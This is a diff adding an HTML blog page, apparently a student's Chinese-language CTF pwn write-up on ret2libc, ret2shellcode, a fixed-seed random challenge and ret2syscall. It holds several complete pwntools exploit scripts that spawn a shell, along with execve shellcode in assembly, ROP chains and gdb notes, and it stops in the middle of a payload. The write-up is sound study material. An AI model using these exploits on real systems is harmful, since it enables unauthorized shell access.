@@ -1,0 +1,727 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>ret2libc、shellcode 与 syscall | 良夜の小窝</title>
+    <meta name="author" content="良夜" />
+    <meta name="description" content="Here's an cat..." />
+    <meta name="keywords" content="良夜,博客,ice993" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/lty.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+<script src="/js/lib/click-effect.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>良夜の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;良夜の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>ret2libc、shellcode 与 syscall</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/15
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #03a9f4">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/ret2libc/" style="color: #ffa2c4">
+                    ret2libc
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/shellcode/" style="color: #00bcd4">
+                    shellcode
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/syscall/" style="color: #00a596">
+                    syscall
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p>libc题，直接套模板套模板</p>
+<p>反编译以后发现了一个问题。</p>
+<p>buf长度超过0x80会自动结束。怎么样让它别检测了呢</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407923-76549df7-6596-487d-ab4d-70a49c97d75f.png"></p>
+<p>后来博览群书后发现这strlen函数它有一个缺点。它读到＼0会终止计数</p>
+<p>它有一个加强版本strnlen。它遇到maxlen就会终止。就没法无限输入进去。但是遇到&#x2F;0它还是会停。</p>
+<p>这道题是strlen函数。在payload之前用＼0截断它就行</p>
+<p>然后用libc公式</p>
+<p>还要注意一个你截断了它的计数，你后面溢出的时候。就不是0x68了，就是0x67。截断的时候也占了一个字节</p>
+<pre><code class="language-python">from pwn import *
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+e = ELF(&quot;./pwn6&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+p = process(&quot;./pwn6&quot;)
+gdb.attach(p, &#39;b main&#39;)
+p.recvuntil(&quot;message:&quot;)
+ret = 0x400556
+rdi = 0x4007d3
+puts_plt = e.plt[&#39;puts&#39;]
+puts_got = e.got[&#39;puts&#39;]
+main = 0x4006B0
+
+payload = b&#39;\x00&#39; 
+payload += b&#39;A&#39;* (0x67) 
+payload += p64(rdi) 
+payload += p64(puts_got) 
+payload += p64(puts_plt) 
+payload += p64(main)
+
+p.sendline(payload)
+p.recvuntil(&quot;Received\n&quot;)
+addr = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))
+print(&quot;puts real addr: &quot; + hex(addr))
+
+libc_base = addr - libc.sym[&#39;puts&#39;]
+system = libc_base + libc.sym[&#39;system&#39;]
+binsh = libc_base+ next(libc.search(b&quot;/bin/sh&quot;))
+
+payload = b&#39;\x00&#39; 
+payload += b&#39;a&#39;* (0x67) 
+payload += p64(ret) 
+payload += p64(rdi) 
+payload += p64(binsh) 
+payload += p64(system)
+p.recvuntil(&quot;message:&quot;)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>这个接收recvuntil搞了半天。后面要加个\n。行了</p>
+<p>把模板稍微精简了一下？（bushi)（地址写短了）</p>
+<h2 id="ret2shellcode1"><a href="#ret2shellcode1" class="headerlink" title="ret2shellcode1"></a>ret2shellcode1</h2><p>先checksec 一下，没有canary</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407976-b2144d57-8fb6-4022-b814-df2c9f2c06a1.png"></p>
+<p>然后用直接自动生成的那个命令（下面的），不用再写汇编或者用网站转化了</p>
+<pre><code class="language-plain">payload=asm(shellcraft.sh())
+</code></pre>
+<p>然后就直接发送payload.成功了</p>
+<p>这里有个问题，第一次没加gdb attach的时候成功了，加了以后反而不行。</p>
+<p>就是下面这两个</p>
+<pre><code class="language-plain">debug_word=&#39;b main&#39;
+gdb attach(p ,debug_word )
+</code></pre>
+<p>它先运行的这个gdb.还没有到后面的程序。所以这个时候直接ls是没有结果的。要继续步进或者直接把gdb关了，才会执行后面的。</p>
+<p>构造的这个它好像直接构造了一个payload就发过去了，好像没有绕过这个nx保护。这是怎么回事。</p>
+<pre><code class="language-python">from pwn import*
+debug_word=&#39;b main&#39;
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./pwn&#39;)
+gdb.attach(p ,debug_word )
+payload=asm(shellcraft.sh())
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="ret2shellcode2"><a href="#ret2shellcode2" class="headerlink" title="ret2shellcode2"></a>ret2shellcode2</h2><p>先checksec文件（以后记得每次先给文件开个权限，报错了三次我以为我写错了）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407860-7c35076b-fca2-47fa-b0db-48a79dcfaf1b.png"></p>
+<p>还是没有canary的shellcode，但是还有nx保护，用ida看一下。里面有mprotect这个函数，就可以直接通过这个函数把.bss段弄成可执行的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407917-b6c53fed-e031-4449-987c-5a819b43fde2.png"></p>
+<p>第一次没明白，这个在gdb里buff的地址怎么看。每次算的时候拿rdi减去0x100缓冲区算下来是高地址。只学会了在gdb里看哪一段可读可写可执行（gdb看的写到底下了，也是后来会的）</p>
+<pre><code class="language-plain">pwndebug&gt; vmmap
+</code></pre>
+<p>后来直接拿ida看了。先找到bss段，然后在里面找buff.找到之后就有了返回地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407917-71388a04-4f6b-4df8-aa6c-f307d1bfc11a.png"></p>
+<p>这是exp</p>
+<pre><code class="language-python">from pwn import*
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+debug_word=&#39;b main&#39;
+p=process(&#39;./shellcode&#39;)
+gdb.attach(p, debug_word)
+shellcode=asm(shellcraft.sh())
+payload=shellcode.ljust(0x108,b&#39;A&#39;)
+payload+=p64(0x4040A0)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>其实上面第二题也可以这么写的，加上补充的。直接那样补充方便一点。</p>
+<pre><code class="language-plain"># 假设 shellcode 长度为 40 字节
+shellcode = b&quot;\x31\xc0\x48\xbb\x...\x00&quot;  # 你的实际 shellcode
+padding = b&#39;A&#39; * (0x108 - len(shellcode))  # 计算需要填充的长度
+payload = shellcode + padding + p64(0x4040A0)
+</code></pre>
+<h2 id="ret2shellcode3"><a href="#ret2shellcode3" class="headerlink" title="ret2shellcode3"></a>ret2shellcode3</h2><p>第三道</p>
+<p>先看checksec 里面有nx保护，但是吧，又跟第一道题一样，它又用了mprotect这个函数。有这个函数即使有nx保护也可以写入shellcode了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409146-71c0ec8e-59d7-46d8-b493-fadac97916ed.png"></p>
+<p>这道题有一个问题，他这个read里面只让写0x25个（最多），然后咱们上面自动生成的shellcode查阅资料后了解到一般是0x70到0x100个长度。所以这回咱们要手写一个短一点的shellcode</p>
+<p>格式基本不变。</p>
+<pre><code class="language-python">from pwn import*
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+debug_word=&#39;b main&#39;
+p=process(&#39;./shellcode&#39;)
+gdb.attach(p, debug_word)
+shellcode=asm() #改成具体手写
+p.sendline(shellcode)
+p.recvuntil(&quot;&quot;)#准确接收和发送，可写可不写吧
+payload=b&#39;A&#39;*(0x00+8)
+payload+=p64(0x000000)#填具体需要覆盖的缓冲区长度和返回的bss段地址
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>然后再看看具体缓冲区要填多少，返回地址在bss哪一段</p>
+<p>按照64位shellcode手写模板写一下</p>
+<p>想办法把指令缩短，但是还具有原来功能。把mov改两个，改成push和pop。</p>
+<p>试了一下发现可以了。就是这个有限制才不行的。</p>
+<p>Exp</p>
+<pre><code class="language-python">from pwn import *
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./ret2shellcode3&#39;)
+
+shellcode = asm(&#39;&#39;&#39;
+    mov rbx, 0x0068732f6e69622f
+    push rbx
+    push rsp
+    pop rdi
+    xor esi,esi
+    xor edx,edx
+    push 59
+    pop rax
+    syscall
+&#39;&#39;&#39;)
+p.recvuntil(&quot;Please.&quot;)
+p.sendline(shellcode)
+
+name_addr=0x6010A0
+payload=b&#39;A&#39;*18+p64(name_addr)
+p.recvuntil(&quot;Let&#39;s start!&quot;)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>还不太清楚每个具体的汇编到底有多少长度。目前只能靠网站看和积累了</p>
+<p>新学了两个gdb指令，看长度</p>
+<pre><code class="language-plain"> disassemble /r main #把main的汇编，汇编的长度，地址全都显示出来
+rasm2 -a x86 -b 64 &quot;pop rax&quot; #说是算单个指令长度的，算出来58我也不知道是啥
+</code></pre>
+<h2 id="写shellcode的时候注意的"><a href="#写shellcode的时候注意的" class="headerlink" title="写shellcode的时候注意的"></a>写shellcode的时候注意的</h2><h3 id="1-为什么要清空-esi-和-edx-寄存器？"><a href="#1-为什么要清空-esi-和-edx-寄存器？" class="headerlink" title="1. 为什么要清空 esi 和 edx 寄存器？"></a>1. 为什么要清空 <code>esi</code> 和 <code>edx</code> 寄存器？</h3><p>这与 Linux 系统调用 <code>execve</code> 的参数要求有关。</p>
+<p>在 64 位 Linux 中，执行系统调用（syscall）时，参数是通过特定的寄存器传递的。对于 <code>execve</code> 系统调用（系统调用号 59，即 <code>0x3b</code>），其 C 语言原型如下：</p>
+<pre><code class="language-c">int execve(const char *pathname, char *const argv[], char *const envp[]);
+</code></pre>
+<p>对应的寄存器分配是：</p>
+<ul>
+<li><code>**rax**</code>: 系统调用号 (59)</li>
+<li><code>**rdi**</code>: 第 1 个参数 <code>pathname</code> (指向 “&#x2F;bin&#x2F;sh” 字符串的地址)</li>
+<li><code>**rsi**</code>: 第 2 个参数 <code>argv[]</code> (指向参数数组的指针)</li>
+<li><code>**rdx**</code>: 第 3 个参数 <code>envp[]</code> (指向环境变量数组的指针)</li>
+</ul>
+<p><strong>为什么要清零？</strong> 当我们只是想简单地拿到一个 shell (getshell) 时，通常不需要传递任何额外的参数（<code>argv</code>），也不需要特定的环境变量（<code>envp</code>）。因此，我们将这两个参数设置为 <strong>NULL</strong>（即 0）是最方便且不容易出错的做法。</p>
+<p><strong>总结：</strong> 清空它们是为了构造 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，告诉系统“我要运行 &#x2F;bin&#x2F;sh，没有参数，没有环境变量”。</p>
+<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>随机数.</p>
+<p>种子固定的。本地可以生成相同的。有nx保护，但是这道题有bin&#x2F;sh.不用写shellcode或者rop链之类的。好像nx也没啥用？</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408622-51228c31-6a1f-4a79-8bbc-7269ad5b1da5.png"></p>
+<p>有现成的后门就直接用了。然后种子固定就能本地生成固定的随机数。可以用本地c语言生成对应随机数</p>
+<pre><code class="language-plain">#include 
+#include 
+int main( )&#123;
+        srand(0x39);
+        printf(&quot;Random: %d\n&quot;, rand());
+        return 0;
+&#125;
+</code></pre>
+<p>运行完是224。直接发送随机数验证的时候sendline(b’224’)又不对了</p>
+<p>我后来拿gdb调了一下。发现这个生成的随机数确实不是224</p>
+<pre><code class="language-plain"> disassemble /r vuln #计算调用rand时的偏移量
+ b *vuln+0x41 #在调用之前下断点
+ r
+ ni #步进到rand调用的时候
+ p $eax #打印此时的随机数
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408698-7e18862a-f14a-46b1-a973-ac5392d34bf2.png"></p>
+<p>到这已经能写这个exp了</p>
+<pre><code class="language-python">from pwn import*
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+debug_word=&#39;vuln&#39;
+p=process(&#39;./random&#39;)
+gdb.attach(p,debug_word)
+p.recvuntil(b&quot;name:&quot;)
+p.sendline(b&#39;1956681178&#39;)
+p.recvuntil(b&quot;next?&quot;)
+payload=b&#39;A&#39;*(0x40+8)
+payload+=p64(0x4008B6)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>但是我看资料，资料上说还有libc,本地c语言生成的还要编译？</p>
+<p>我直接看了这两种方法</p>
+<p>这个libc泄露还是撞库，只会了固定种子的。这个随机种子的话格式还不会写。</p>
+<pre><code class="language-plain">libc = CDLL(&quot;libc.so.6&quot;)
+libc.srand(0x39)
+</code></pre>
+<p>前面加上这两个就行了。对，还要引入一个工具。</p>
+<pre><code class="language-plain">from ctypes import*
+</code></pre>
+<p>然后关于c语言编译的问题。</p>
+<p>我用的是windows编译的c。而要用linux编译才对</p>
+<pre><code class="language-plain">vim text.c
+</code></pre>
+<p>然后写自己本地的c语言，写好以后gcc 编译就可以（这的gcc还不熟。没找见gcc表，就只会了两个看的。但是进去看不太懂）</p>
+<pre><code class="language-plain">gcc text.c -o text &amp;&amp;./text
+man gcc  ;看gcc指令的两个
+help gcc
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408694-a9ecb4a4-d884-42a9-8577-4fd13af8f51f.png"></p>
+<h2 id="retsyscall1"><a href="#retsyscall1" class="headerlink" title="retsyscall1"></a>retsyscall1</h2><p>构造syscall的rop链。有nx保护了。再看ida（感觉每次check完都是这）</p>
+<p>不是，为啥会有system和sh?没有bin&#x2F;sh.试试看这个sh能不能发挥以下bin&#x2F;sh的作用。这个感觉这下连rop链都不用弄了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408728-9f8cefe5-72d0-4e93-8392-2d54506706e6.png"></p>
+<p>把system和sh的找见就行了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409527-74ad0a3e-064f-4711-98bc-82ed396a6d78.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409569-79689a28-d223-4ac6-b96a-791b322c80b1.png"></p>
+<p>找这个又花了半天时间。字符串按u就能拆开。对ida还是不太熟悉</p>
+<p>可以了</p>
+<p>感觉跟刚开始学栈溢出做的题一样。就写个payload就行了</p>
+<pre><code class="language-sql">from pwn import*
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./ret2syscall1&#39;)
+gdb.attach(p,&#39;b main&#39;)
+system=0x8048529  
+sh=0x8048670
+payload=b&#39;A&#39;*(0x18+4)+p32(system)+p32(sh)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>为什么sh能当bin&#x2F;sh来用，是规定。sh和bin&#x2F;sh能发挥一样的作用</p>
+<h2 id="ret2syscall2"><a href="#ret2syscall2" class="headerlink" title="ret2syscall2"></a>ret2syscall2</h2><p>我觉得应该要构造rop链了</p>
+<p>先拿ida看一下。第一次见这么多函数，完了完了完了，这次有canary了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409516-236d4647-23c0-4394-a47c-471af8501fc5.png"></p>
+<p>先分析一下ida，用gadrop命令把构造rop链需要的东西找出来</p>
+<p>这道题好像是一个游戏。还没找到漏洞.连上之后先玩一下。</p>
+<p>他这个买的时候输完数量确定之后就算成交。只有这个数量咱们有操作空间。想一想。直接输入恶意一点的。特殊字符或者不是正数。不按它要求来就行了。它输入这种就一直运行就停不下来了”^^^”</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409581-a9bafeba-9a97-44b5-b3a7-96bd69978b87.png"></p>
+<p>输入负数就行了</p>
+<p>这道题没有后门，ROP链要改一下。</p>
+<p>bin&#x2F;sh写到name里</p>
+<p>Exp</p>
+<pre><code class="language-python">from pwn import*
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./ret2syscall2&#39;)
+gdb.attach(p,&#39;b menu&#39;)
+pop_rax = 0x458827
+pop_rdi = 0x40264f
+pop_rsi = 0x40a67e
+pop_rdx = 0x4a404b
+ret = 0x40101a 
+syscall = 0x402404
+bin_sh = 0x4E60F0
+
+p.sendline(b&#39;1&#39;)
+p.sendline(b&#39;3&#39;)
+p.sendline(b&#39;-999999&#39;)
+p.sendline(b&#39;4&#39;)
+p.sendline(b&#39;5&#39;)
+
+payload = b&#39;/bin/sh\x00&#39;
+payload += b&#39;A&#39; * (0x20) 
+payload += p64(pop_rax)  
+payload += p64(0x3b)        
+payload += p64(pop_rdi)  
+payload += p64(bin_sh)   
+payload += p64(pop_rsi)  
+payload += p64(0)     
+payload += p64(pop_rdx)  
+payload += p64(0) 
+payload += p64(0)
+payload += p64(ret)
+payload += p64(syscall) 
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="fmt1"><a href="#fmt1" class="headerlink" title="fmt1"></a>fmt1</h2><h2 id="gdb调试在第二道shellcode里应用一下，想到的一些东西"><a href="#gdb调试在第二道shellcode里应用一下，想到的一些东西" class="headerlink" title="gdb调试在第二道shellcode里应用一下，想到的一些东西"></a>gdb调试在第二道shellcode里应用一下，想到的一些东西</h2><p>查看对应东西的指令</p>
+<pre><code class="language-plain">(gdb) x/i 0x4011f4          # 查看该地址对应的汇编指令
+(gdb) info symbol 0x4011f4  # 查看符号信息
+(gdb) bt                    # 查看完整调用栈
+</code></pre>
+<p>原来是拿ida直接看的这个bss段里面到底是啥(现在也不会用gdb看里面是什么函数)，这个buff具体在哪，它是不是可读可写可执行的。拿gdb试了一下</p>
+<pre><code class="language-plain">print &amp;buff
+</code></pre>
+<p>这个可以直接打印出buff的地址(</p>
+<pre><code class="language-plain">x/16x 0x4040A0 #查看从地址0x4040A0开始的16个字符的数据
+ x/s 0x4040A0 #显示这段地址指向的内存内容
+ x/4d 0x4040A0 #显示所在地址的4个整数内容
+</code></pre>
+<p><strong>0x7fffffffdcd0</strong> 是典型的栈地址：</p>
+<ul>
+<li>位于内存的高地址区域（x86-64架构栈通常从高地址向低地址增长）</li>
+</ul>
+<p>Linux默认代码段起始地址是0x400000</p>
+<p>这是检查有没有被覆盖</p>
+<pre><code class="language-plain">(gdb) x/gx $rsp + 0x108        # 查看返回地址是否被覆盖为 0x4040A0
+(gdb) x/32x $rsp              # 查看整个缓冲区的内存布局
+</code></pre>
+<p>我后来又想了想这个栈溢出到底在干啥。周三我终于明白了。其实最简单的栈溢出就是什么也没有，直接溢出就行.然后之后的这些libc，shellcode,syscall,都是因为返回地址缺失，导致溢出之后无法发送返回地址。所以才要构造这些东西来绕过具体的保护。</p>
+<h2 id="libc是在栈不可执行（NX），并且在bss段不可执行的时候。"><a href="#libc是在栈不可执行（NX），并且在bss段不可执行的时候。" class="headerlink" title="libc是在栈不可执行（NX），并且在bss段不可执行的时候。"></a>libc是在栈不可执行（NX），并且在bss段不可执行的时候。</h2><p>通过动态链接库libc(里面有system和bin&#x2F;sh这些符号)通过writes,puts.计算基地址。有了基地址后再算system和bin&#x2F;sh的地址。用前面了解到的公式</p>
+<pre><code class="language-plain">libc_base = puts_real_address -libc.sym[&#39;puts&#39;]
+system_address = libc_base + libc.sym[&#39;system&#39;]
+binsh_address = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+</code></pre>
+<h2 id="shellcode是在栈不可执行（NX），并且bss-段可执行，要溢出的函数不在栈上。或者干脆没有shellcode"><a href="#shellcode是在栈不可执行（NX），并且bss-段可执行，要溢出的函数不在栈上。或者干脆没有shellcode" class="headerlink" title="shellcode是在栈不可执行（NX），并且bss.段可执行，要溢出的函数不在栈上。或者干脆没有shellcode"></a>shellcode是在栈不可执行（NX），并且bss.段可执行，要溢出的函数不在栈上。或者干脆没有shellcode</h2><p>这个时候通常能直接发送shellcode来构造一个返回地址。问题就在于怎么处理这个shellcode了。是自动生成直接写入，还是需要补齐shellcode,写入到对应的bss段上。最后要找返回地址覆盖。</p>
+<p>当有mprotect函数的时候，即使有nx保护，也可以配合read和gets函数把shellcode写到bss段</p>
+<p>生成shellcode和补齐，还有直接利用汇编或网站转化汇编成</p>
+<pre><code class="language-plain">shellcode=asm(shellcraft.sh()) #自动生成
+payload=shellcode.ljust(0x108,b&#39;A&#39;) #补齐
+</code></pre>
+<p>手写shellcode时的汇编指令</p>
+<p>先熟悉一下基本汇编指令</p>
+<pre><code class="language-plain">mov rax,0x50 #把0x50赋值2给rax寄存器
+add rax,0x50 #将0x50加到rax寄存器
+push rax 将rax值推入栈中
+pop rax 将栈中存储的数据拿出放入rax
+xor al, 0x50 对al寄存器进行异或操作，与0x50进行异或（相同为0，不同为1）
+xor eax,dword ptr[rdx + 0x30] #先加0x30,取地址中存储的值。再异或
+</code></pre>
+<p>然后学了32位和64位shellcode的模板。由于32位和64位传参不同，编写shellcode时就不同。最后返回的就不一样，一个是0x80，一个是syscall。</p>
+<pre><code class="language-plain">；x32
+    push 0x68732f2f   
+    push 0x6e69622f 
+    mov ebx, esp   
+    xor ecx, ecx
+    xor edx, edx     
+    mov al, 0xb
+    int 0x80
+</code></pre>
+<pre><code class="language-plain">;x64
+    mov rbx, 0x0068723f6e69622f
+    push rbx
+    mov rdi,rsp
+    mov rsi,0
+    mov rdx,0
+    mov rax, 59      ;syscall号59
+    syscall 
+    ;这个是基本模板，如果有限制长度需要更改
+</code></pre>
+<p>因为第三道题read只让写0x25数据，你要通过read再写入shellcode直接自动生成是不行的。（因为自动生成的生成的长度比较长大约在0x70到0x100个之间）。手写shellcode汇编</p>
+<p>Syscall</p>
+<h2 id="retsyscall是call出来这个system-具体理论还不清楚。主要是会了syscall这个rop链"><a href="#retsyscall是call出来这个system-具体理论还不清楚。主要是会了syscall这个rop链" class="headerlink" title="retsyscall是call出来这个system?具体理论还不清楚。主要是会了syscall这个rop链"></a>retsyscall是call出来这个system?具体理论还不清楚。主要是会了syscall这个rop链</h2><h2 id="32和64位传参规则（Linux）"><a href="#32和64位传参规则（Linux）" class="headerlink" title="32和64位传参规则（Linux）"></a>32和64位传参规则（Linux）</h2><h3 id="系统调用下传参："><a href="#系统调用下传参：" class="headerlink" title="系统调用下传参："></a>系统调用下传参：</h3><p>32位触发指令：int 0x80</p>
+<p>寄存器：eax 系统调用号（0x0b）</p>
+<p>ebx、ecx、 edx、esi、edi 依次传参 </p>
+<p>调用bin&#x2F;sh</p>
+<pre><code class="language-plain">mov eax, 0x0b       ; 调用系统
+mov ebx, binsh_addr ; bin/sh
+mov ecx, 0          ; 置零
+mov edx, 0          
+int 0x80
+</code></pre>
+<p>64位触发指令：syscall</p>
+<p>传递寄存器：rax ,系统调用号（exexecve）</p>
+<p>为（0x3b）</p>
+<p>六个寄存器传参</p>
+<p>rdi rsi rdx r10 r8 r9</p>
+<p>一至六个参数</p>
+<pre><code class="language-plain">mov rax, 0x3b       ; 调用系统
+mov rdi, binsh_addr ; bin/sh
+mov rsi, 0          ; 置零
+mov rdx, 0          
+syscall
+</code></pre>
+<h3 id="普通调用传参"><a href="#普通调用传参" class="headerlink" title="普通调用传参"></a>普通调用传参</h3><p>32位从右向左压栈，最后清理栈空间</p>
+<p>调用（a,b,c）（注意后进先出）</p>
+<pre><code class="language-plain">push c  ; 先压最后出的
+push b
+push a
+call func
+add esp, 12 ; 清理空间，3×4=12
+</code></pre>
+<p>64位混合传递。先用寄存器，再用栈传参。</p>
+<p>前六个依次通过</p>
+<p>rdi rsi rdx rcx r8 r9</p>
+<p>rsp指针要求16字节栈对齐</p>
+<pre><code class="language-plain">mov rdi, a  
+mov rsi, b  
+mov rdx, c  
+mov rcx, d  
+mov r8, e   
+mov r9, f   
+push g      ; 参数7压栈
+call func   ；调用fun函数
+</code></pre>
+<pre><code class="language-plain"> x/10x $rsp
+ info registers
+</code></pre>
+<p>其它的：32位寄存器使用pop减少链长度</p>
+<p>整体压栈或通过指针传递</p>
+<p>64位注意栈对齐。用ret强制对齐。先用寄存器，再用栈传递</p>
+<h2 id="syscall的rop链（这是有bin-sh地址的）"><a href="#syscall的rop链（这是有bin-sh地址的）" class="headerlink" title="syscall的rop链（这是有bin&#x2F;sh地址的）"></a>syscall的rop链（这是有bin&#x2F;sh地址的）</h2><p>32位</p>
+<pre><code class="language-plain">payload = b&#39;A&#39; * offset  
+payload += p32(pop_eax_ret)  # ROPgadget pop eax; ret
+payload += p32(0xb)           # 调用系统
+payload += p32(pop_edx_ecx_ebx_ret)  # gadget: pop edx; pop ecx; pop ebx; ret
+payload += p32(0)                   # 置零
+payload += p32(0)                 
